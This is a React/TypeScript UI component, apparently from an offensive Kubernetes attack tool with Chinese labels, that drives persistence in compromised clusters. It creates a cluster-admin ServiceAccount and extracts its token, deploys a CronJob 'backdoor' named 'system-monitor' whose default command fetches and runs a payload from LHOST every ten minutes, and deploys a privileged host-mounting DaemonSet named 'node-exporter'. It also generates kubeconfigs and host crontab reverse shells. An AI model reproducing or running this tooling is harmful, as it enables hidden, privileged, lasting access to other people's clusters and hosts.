import React, { useState } from 'react';
import { Button, Card, Input, Space, Tabs, Tag } from 'antd';
import { api, targetParams } from '../services/api';
import ResultView from '../components/ResultView';

interface Props { getAuth: () => import('../services/api').AuthConfig; addLog: (msg: string) => void; }

export default function PersistTab({ getAuth, addLog }: Props) {
  const base = targetParams(getAuth()) as any;

  const [saNs, setSaNs] = useState('kube-system');
  const [saName, setSaName] = useState('admin-user');
  const [saBind, setSaBind] = useState('admin-bind');
  const [saResult, setSaResult] = useState<any>(null);
  const [saLoading, setSaLoading] = useState(false);

  const [cjNs, setCjNs] = useState('kube-system');
  const [cjName, setCjName] = useState('system-monitor');
  const [cjImg, setCjImg] = useState('alpine');
  const [cjSched, setCjSched] = useState('*/10 * * * *');
  const [cjCmd, setCjCmd] = useState('sh -c "wget -q http://LHOST/payload -O /tmp/p && sh /tmp/p"');
  const [cjResult, setCjResult] = useState<any>(null);
  const [cjLoading, setCjLoading] = useState(false);

  const [dsNs, setDsNs] = useState('kube-system');
  const [dsName, setDsName] = useState('node-exporter');
  const [dsImg, setDsImg] = useState('alpine');
  const [dsMount, setDsMount] = useState('/host');
  const [dsCmd, setDsCmd] = useState('while true; do sleep 3600; done');
  const [dsResult, setDsResult] = useState<any>(null);
  const [dsLoading, setDsLoading] = useState(false);

  const [kcServer, setKcServer] = useState('');
  const [kcCluster, setKcCluster] = useState('pwned-cluster');
  const [kcToken, setKcToken] = useState('');
  const [kcResult, setKcResult] = useState<any>(null);
  const [kcLoading, setKcLoading] = useState(false);

  const [hLhost, setHLhost] = useState('');
  const [hLport, setHLport] = useState('4444');
  const [hResult, setHResult] = useState<any>(null);
  const [hLoading, setHLoading] = useState(false);

  const run = async (fn: () => Promise<any>, setResult: (r: any) => void, setLoading: (v: boolean) => void, label: string) => {
    setLoading(true); setResult(null);
    try { const r = await fn(); setResult(r); addLog(`[+] ${label}`); }
    catch (e) { setResult({ error: String(e) }); addLog(`[-] ${label} failed`); }
    finally { setLoading(false); }
  };

  const handleSA = () => run(() => api.persist.createSA({ ...base, namespace: saNs, sa_name: saName, binding_name: saBind }), setSaResult, setSaLoading, 'Admin SA deployed');
  const handleSAToken = () => run(() => api.persist.getSAToken({ ...base, namespace: saNs, sa_name: saName }), setSaResult, setSaLoading, 'SA Token retrieved');
  const handleCJ = () => run(() => api.persist.cronjob({ ...base, namespace: cjNs, name: cjName, image: cjImg, schedule: cjSched, command: cjCmd }), setCjResult, setCjLoading, 'CronJob deployed');
  const handleDS = () => run(() => api.persist.daemonset({ ...base, namespace: dsNs, name: dsName, image: dsImg, mount_path: dsMount, command: dsCmd }), setDsResult, setDsLoading, 'DaemonSet deployed');
  const handleKC = () => run(() => api.persist.kubeconfig({ server: kcServer || base.target_host || '', cluster: kcCluster, token: kcToken || base.token || '' }), setKcResult, setKcLoading, 'Kubeconfig generated');
  const handleHost = () => run(() => api.persist.hostCrontab({ lhost: hLhost, lport: hLport }), setHResult, setHLoading, 'Host persistence generated');

  return (
    <Tabs defaultActiveKey="sa" size="small">
      <Tabs.TabPane tab="服务Account" key="sa">
        <Card size="small">
          <Space direction="vertical" style={{ width: '100%' }}>
            <Space><Input addonBefore="命名空间" value={saNs} onChange={e => setSaNs(e.target.value)} style={{ width: 150 }} /><Input addonBefore="名称" value={saName} onChange={e => setSaName(e.target.value)} style={{ width: 140 }} /><Input addonBefore="绑定" value={saBind} onChange={e => setSaBind(e.target.value)} style={{ width: 140 }} /></Space>
            <Space>
              <Button type="primary" onClick={handleSA} loading={saLoading}>创建SA+CRB</Button>
              <Button onClick={handleSAToken} loading={saLoading}>获取Token</Button>
            </Space>
            <ResultView result={saResult} loading={saLoading} emptyHint="创建 cluster-admin ServiceAccount 并获取 Token" />
          </Space>
        </Card>
      </Tabs.TabPane>
      <Tabs.TabPane tab="CronJob" key="cj">
        <Card size="small">
          <Space direction="vertical" style={{ width: '100%' }}>
            <Space wrap><Input addonBefore="命名空间" value={cjNs} onChange={e => setCjNs(e.target.value)} style={{ width: 130 }} /><Input addonBefore="名称" value={cjName} onChange={e => setCjName(e.target.value)} style={{ width: 130 }} /><Input addonBefore="镜像" value={cjImg} onChange={e => setCjImg(e.target.value)} style={{ width: 120 }} /><Input addonBefore="周期" value={cjSched} onChange={e => setCjSched(e.target.value)} style={{ width: 130 }} /></Space>
            <Input addonBefore="命令" value={cjCmd} onChange={e => setCjCmd(e.target.value)} />
            <Space>
              <Button type="primary" onClick={handleCJ} loading={cjLoading}>生成并部署</Button>
              {cjResult?.applied && <Tag color="green">{cjResult.applied}</Tag>}
              {cjResult?.error && <Tag color="red">错误: {cjResult.error}</Tag>}
            </Space>
            <ResultView result={cjResult} loading={cjLoading} emptyHint="创建定时CronJob后门，周期性执行命令" />
          </Space>
        </Card>
      </Tabs.TabPane>
      <Tabs.TabPane tab="DaemonSet" key="ds">
        <Card size="small">
          <Space direction="vertical" style={{ width: '100%' }}>
            <Space wrap><Input addonBefore="命名空间" value={dsNs} onChange={e => setDsNs(e.target.value)} style={{ width: 130 }} /><Input addonBefore="名称" value={dsName} onChange={e => setDsName(e.target.value)} style={{ width: 130 }} /><Input addonBefore="镜像" value={dsImg} onChange={e => setDsImg(e.target.value)} style={{ width: 120 }} /></Space>
            <Space><Input addonBefore="挂载" value={dsMount} onChange={e => setDsMount(e.target.value)} style={{ width: 160 }} /><Input addonBefore="命令" value={dsCmd} onChange={e => setDsCmd(e.target.value)} style={{ width: 280 }} /></Space>
            <Space>
              <Button type="primary" onClick={handleDS} loading={dsLoading}>生成并部署</Button>
              {dsResult?.applied && <Tag color="green">{dsResult.applied}</Tag>}
              {dsResult?.error && <Tag color="red">错误: {dsResult.error}</Tag>}
            </Space>
            <ResultView result={dsResult} loading={dsLoading} emptyHint="创建特权DaemonSet后门，在所有节点运行" />
          </Space>
        </Card>
      </Tabs.TabPane>
      <Tabs.TabPane tab="Kubeconfig" key="kc">
        <Card size="small">
          <Space direction="vertical" style={{ width: '100%' }}>
            <Space><Input addonBefore="服务器" value={kcServer} onChange={e => setKcServer(e.target.value)} placeholder="host:6443" style={{ width: 250 }} /><Input addonBefore="集群" value={kcCluster} onChange={e => setKcCluster(e.target.value)} style={{ width: 150 }} /></Space>
            <Input.TextArea rows={3} placeholder="Token" value={kcToken} onChange={e => setKcToken(e.target.value)} />
            <Button type="primary" onClick={handleKC} loading={kcLoading}>生成 Kubeconfig</Button>
            <ResultView result={kcResult} loading={kcLoading} emptyHint="输入服务器地址和Token生成kubeconfig" />
          </Space>
        </Card>
      </Tabs.TabPane>
      <Tabs.TabPane tab="Host" key="host">
        <Card size="small">
          <Space direction="vertical" style={{ width: '100%' }}>
            <Space><Input addonBefore="LHOST" value={hLhost} onChange={e => setHLhost(e.target.value)} style={{ width: 170 }} /><Input addonBefore="LPORT" value={hLport} onChange={e => setHLport(e.target.value)} style={{ width: 120 }} /></Space>
            <Button type="primary" onClick={handleHost} loading={hLoading}>生成主机持久化命令</Button>
            <ResultView result={hResult} loading={hLoading} emptyHint="生成主机级别的持久化脚本（crontab反弹shell等）" />
          </Space>
        </Card>
      </Tabs.TabPane>
    </Tabs>
  );
}
